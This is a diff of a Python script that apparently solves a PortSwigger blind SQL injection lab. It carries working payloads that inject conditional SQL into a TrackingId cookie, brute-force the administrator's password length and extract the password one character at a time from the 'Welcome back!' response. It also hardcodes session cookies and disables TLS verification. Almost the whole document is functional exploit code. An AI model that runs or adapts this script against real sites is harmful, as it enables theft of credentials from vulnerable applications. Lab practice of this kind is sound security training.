@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import requests
+from requests.models import Response
 import urllib3
 from sys import argv
 from urllib import parse
@@ -11,6 +12,9 @@ import string
 
 '''
 Comments
+
+Morning if it's morning,
+Evening if it's evening 
 
 https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
 
@@ -40,9 +44,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 # change it manuale 
-SiteCookies = {'TrackingId': '6PcBBfx7XAa2A5Ml' , 'session':'bxB7panN6K3JCvkdKxelpyMGUki6HrRu'}
+SiteCookies = {'TrackingId': 'bXlY0udfavmY0We8' , 'session':'E4ogKB42ysYD3N4LI4iNU41zK2icoTJE'}
 
-TargetUrl=argv[1]
 
 # ================================= Functions ================================= #
 
@@ -50,66 +53,82 @@ TargetUrl=argv[1]
 # defualt value their is no cookies or proxies
 def sendRequest(TargetUrl , proxies=None , cookies=None):
     try :
-        result = requests.get(TargetUrl ,  cookies=cookies , proxies=proxies, verify=False )
-        return [result.text,result.status_code]
+        result = requests.get(TargetUrl ,  cookies=cookies , proxies=None, verify=False )
+        return [result.text, result.status_code]
     except:
         print("error")
 
-# encode the payload [URL ENCODE]
+# Url encode the payload 
 def encodePayload(payload):
     return parse.quote(payload)
 
-def NormalfindLength(TargetUrl,payload,maxLength=50):
-    for i in range(maxLength):
+
+# Find the length of the password by brute Forceing
+def BruteForceFindLength(TargetUrl, payload, infectedCookie ,maxLength=50):
+
+    infectedCookieValue = SiteCookies.get(infectedCookie , "'")
+    for i in range(1, maxLength+1): # no zero password length , add 1 to reach the given number 
         # Edit the value of the cookie to set the payload in it 
-        SiteCookies["TrackingId"] = "XPjXEAnLufZXZ5sH" + encodePayload(payload.format(num=i))
-        #print(SiteCookies["TrackingId"])
+        # Payload must have {passLength} to format it 
+        # Updated the Cookie to add the payload to it
+        SiteCookies[infectedCookie] = infectedCookieValue + encodePayload(payload.format(passLength=i))
         
         # send the request with cookies after puting the dynamic payload 
-        status = sendRequest(TargetUrl , cookies=SiteCookies , proxies=None)
+        responseStatus = sendRequest(TargetUrl , cookies=SiteCookies , proxies=None)
         
-        if status : 
+        if responseStatus : 
             # print status code of the response
-            print(status[1],end=" ")
-            if "Welcome back!" in status[0]:
-                print("Moer than: " , i) # This means the condition is True
+            print(responseStatus[1],end=" ")
+            # Refactor this part - make a fun to check for a dynamic word and return true if it's in
+            if "Welcome back!" in responseStatus[0]:
+                print("Moer than: " , i) # This means the condition is True && the password length is bigger than i
+            elif responseStatus[1] != 200:
+                print("\nText\n" , responseStatus[0])
+                break
             else:
                 print("Done password Length is: " , i)
                 break    
         else:
-            print("error")
+            print("Error - Status code: ",responseStatus[1], "\nText:\n", responseStatus[0] )
 
-def BruteForceCrackPassword(TargetUrl,start,end, wordlist , payload ):
-    result = []
-    for i in range(start,end):
-        for a in wordlist:
+
+
+def BruteForcePassword(TargetUrl, passwordLength ,infectedCookie, wordlist, payload ):
+    crackedPasswod = []
+    infectedCookieValue = SiteCookies.get(infectedCookie , "'")
+    for i in range(1,passwordLength+1): # To crack the last index
+        for passValue in wordlist:
             # Edit the value of the cookie to set the payload in it 
-            SiteCookies["TrackingId"] = "6PcBBfx7XAa2A5Ml" + encodePayload(payload.format(num=i,letter=a))
-            #print(SiteCookies["TrackingId"])
+            SiteCookies[infectedCookie] = infectedCookieValue + encodePayload(payload.format(indexOfletter=i,letter=passValue))
             
             # send the request with cookies after puting the dynamic payload 
-            status = sendRequest(TargetUrl , cookies=SiteCookies , proxies=None)
+            responseStatus = sendRequest(TargetUrl , cookies=SiteCookies , proxies=proxies)
             
-            if status : 
+            if responseStatus : 
                 # print status code of the response
-                print(status[1],"- index of letter: ",a,"Letter:",i , sep=" ")
-                if "Welcome back!" in status[0]:
-                    result.append(a) # This means the condition is True
-                    print("Letter:",a, "found in:" , i , sep=" ")
+                print(responseStatus[1],end=" ")
+                # Refactor this part - make a fun to check for a dynamic word and return true if it's in
+                if "Welcome back!" in responseStatus[0]:
+                    crackedPasswod.append(passValue) # This means the condition is True
+                    print("Index:", i, "is:" , passValue , sep=" ")
                     break
+                elif responseStatus[1] != 200:
+                    print("\nText\n" , responseStatus[0])
+                    print("".join(str(i) for i in crackedPasswod))
+                    exit()
                 else:
-                    print("Index:" , i, "is Not:", a,sep=" ")           
+                    print("Index:" , i, "is Not:", passValue, sep=" ")           
             else:
-                print("error")
+                print("Error - Status code: ",responseStatus[1], "\nText:\n", responseStatus[0] )
 
-    passwod = "".join(str(i) for i in result)
-    print(passwod)
+    password = "".join(str(i) for i in crackedPasswod)
+    print(password)
 
 
 def binarySearch(array , num , low , high):
     
-    BinarySearchPayload = " 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){operator}{num})='a".format(operator="=")
-
+    BinarySearchLengthPayload = " 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){operator}{num})='a".format(operator="=")
+    BinarySearchCrakPayload = "'AND (SELECT SUBSTRING(password,{indexOfletter},1) FROM users WHERE username='administrator'){operator}'{letter}".format(operator="=")
     # Repeat until the pointers low and high meet each other
     while low <= high:
 
@@ -133,13 +152,26 @@ def binarySearch(array , num , low , high):
 
 
 if __name__ == '__main__':
-    crakPayload = "'AND (SELECT SUBSTRING(password,{num},1) FROM users WHERE username='administrator')='{letter}"
-    LengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a"
-    if argv[2] == "length":
-        length= int(input("Enter max length: "))
-        NormalfindLength(TargetUrl,LengthPayload,maxLength=length)
-    elif argv[3] == "crack":
-        # None till i make argv
-        BruteForceCrackPassword(TargetUrl,start=None,end=None,wordlist=None,payload=None)
+
+    numberOfArguments = len(argv)
+    #if numberOfArguments == 1:
+    #    print("-length [ Password Length] To BruteForce Finding password length\n-crack [ Max password length ] edit the wordlist if you want   ")
+    if numberOfArguments == 4:
+        TargetUrl=argv[1]
     else:
-        print("use length or crack")
+        print("Traget Url + options\n-length [ Password Length ] To BruteForce Finding password length\n-crack [ Max password length ] edit the wordlist if you want   ")
+        exit()
+
+    crakPayload = "'AND (SELECT SUBSTRING(password,{indexOfletter},1) FROM users WHERE username='administrator')='{letter}"
+    LengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{passLength})='a"
+
+    if argv[2] == "-length":
+        Maxlength= int(argv[3])
+        BruteForceFindLength(TargetUrl, LengthPayload , infectedCookie="TrackingId" ,maxLength=Maxlength)
+    elif argv[2] == "-crack":
+        # None till i make argv
+        PasswordLength = int(argv[3])
+        Wordlist = string.ascii_letters + string.digits
+        BruteForcePassword(TargetUrl, passwordLength=PasswordLength, infectedCookie="TrackingId" ,wordlist=Wordlist, payload=crakPayload)
+    else:
+        print("-length [ Password Length] To BruteForce Finding password length\n-crack [ Max password length ] edit the wordlist if you want   ")
